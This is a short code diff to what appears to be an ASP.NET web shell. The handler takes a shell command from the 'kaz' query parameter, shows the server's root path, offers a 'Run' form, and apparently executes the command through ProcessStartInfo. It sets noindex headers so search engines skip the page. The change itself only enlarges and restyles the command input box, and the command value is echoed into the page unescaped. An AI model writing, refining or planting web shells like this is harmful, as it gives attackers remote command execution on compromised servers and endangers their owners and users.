@@ -17,7 +17,7 @@ ctx.Response.Headers.Add("X-Robots-Tag", "noindex, nofollow");
     string command = HttpUtility.ParseQueryString(url.Query).Get("kaz");
 ctx.Response.Write("<meta name='robots' content='noindex, nofollow'>");
     ctx.Response.Write(HttpContext.Current.Server.MapPath("/"));
-    ctx.Response.Write("<br><br><form method='GET'>~# <input name='kaz' value='"+command+"'><input type='submit' value='Run'></form>");
+    ctx.Response.Write("<br><br><form method='GET'>~# <input name='kaz' value='" + command + "' style='height:30px;width:800px;' placeholder='Enter command here'><input type='submit' value='Run'></form>");
     ctx.Response.Write("<hr>");
     ctx.Response.Write("<pre>");
     ProcessStartInfo psi = new ProcessStartInfo();
